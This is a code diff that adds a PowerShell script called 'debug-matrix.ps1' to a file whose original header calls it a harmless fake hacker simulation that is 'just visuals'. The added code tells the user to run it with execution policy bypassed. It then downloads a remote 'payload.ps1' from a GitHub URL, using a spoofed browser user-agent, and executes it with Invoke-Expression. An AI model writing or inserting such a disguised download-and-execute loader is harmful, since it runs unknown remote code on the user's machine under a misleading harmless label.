@@ -1,3 +1,38 @@
+# Save as debug-matrix.ps1 then run: powershell -ExecutionPolicy Bypass -File .\debug-matrix.ps1
+
+$ErrorActionPreference = "Stop"
+$LogFile = "$env:TEMP\matrix_debug.log"
+
+function Write-Log {
+    param($Message, $Level="INFO")
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    $logEntry = "[$timestamp] [$Level] $Message"
+    Write-Host $logEntry -ForegroundColor Green
+    $logEntry | Out-File -FilePath $LogFile -Append -Encoding UTF8
+}
+
+try {
+    Write-Log "=== MATRIX DEBUG PAYLOAD STARTING ===" "DEBUG"
+    
+    # Fix: Use stable GitHub raw URL
+    $url = "https://raw.githubusercontent.com/kkeyal223/hue/main/payload.ps1"
+    Write-Log "Downloading from: $url" "INFO"
+    
+    $webClient = New-Object System.Net.WebClient
+    $webClient.Headers.Add("User-Agent", "Mozilla/5.0")
+    $scriptContent = $webClient.DownloadString($url)
+    Write-Log "Download SUCCESS - Length: $($scriptContent.Length) chars" "SUCCESS"
+    
+    Write-Log "Executing payload..." "INFO"
+    Invoke-Expression $scriptContent
+    
+    Write-Log "Payload completed normally" "SUCCESS"
+} catch {
+    Write-Log "CRASH DETECTED: $($_.Exception.Message)" "ERROR"
+    Write-Log "StackTrace: $($_.ScriptStackTrace)" "ERROR"
+    Write-Host "`n=== DEBUG LOG SAVED: $LogFile ===" -ForegroundColor Red
+    pause
+}
 # Fake Hacker Simulation Script
 # Totally harmless – just visuals 😎
 
